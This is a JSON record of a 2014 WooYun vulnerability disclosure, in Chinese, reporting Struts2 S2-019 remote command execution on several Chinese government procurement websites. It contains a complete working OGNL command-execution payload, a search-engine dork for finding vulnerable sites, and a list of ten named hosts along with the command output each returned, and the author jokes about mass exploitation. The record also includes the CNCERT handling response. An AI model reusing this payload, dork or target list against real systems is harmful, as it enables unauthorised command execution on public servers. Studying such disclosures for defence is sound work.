{"id": 52222, "wybug_id": "wooyun-2014-071934", "wybug_title": "多个政府站在struts2命令执行", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "scanf", "wybug_date": "2014-08-11 16:20", "wybug_open_date": "2014-09-25 16:22", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程命令执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-25：\t细节向公众公开  简要描述： 好屌的感觉！！ 详细说明：  \nhttp://struts.apache.org/release/2.3.x/docs/s2-019.html\npost提交\ndebug=command&expression=#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),#req=@org.apache.struts2.ServletActionContext@getRequest(),#resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'命令'})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[10000],#d.read(#e),#resp.println(#e),#resp.close()\n列子http://www.ycggzy.gov.cn/articleWeb!view.action?article.id=1698&type=js&resourceCode=jszbgg\n\n上谷歌关键字inurl:articleweb!view.action   漏洞证明：  \n\n\n\n都是清一色政府的\nhttp://wzggzy.net windows-gusbv9k\\administratorwww.naggzy.gov.cn jyzx-1ec4e372b9\\administratorhttp://www.xsggzy.com win-s921scasbmq\\administratorhttp://www.whggzy.com windows-fgidx77\\administratorhttp://ggzy.hnloudi.gov.cn webserver1\\administrator http://www.ycggzy.gov.cn web-1\\administratorhttp://www.lszwdt.gov.cn zw-2\\administratorhttp://www.yxggzy.cn web1\\administratorhttp://bynrzfcg.cn win-avj5eue5yb6\\administratorhttp://218.59.235.206 windows-49osr5l\\administrator\n随便找的10个\n\n如果被批量就好玩了   修复方案：  升级到最新的行不行？   版权声明：转载请注明来源 scanf@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-08-16 10:11 厂商回复：   最新状态： 2014-08-20：补充处置情况：CNVD确认并复现所述情况，已经转由CNCERT分别下发给对应的分中心。  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}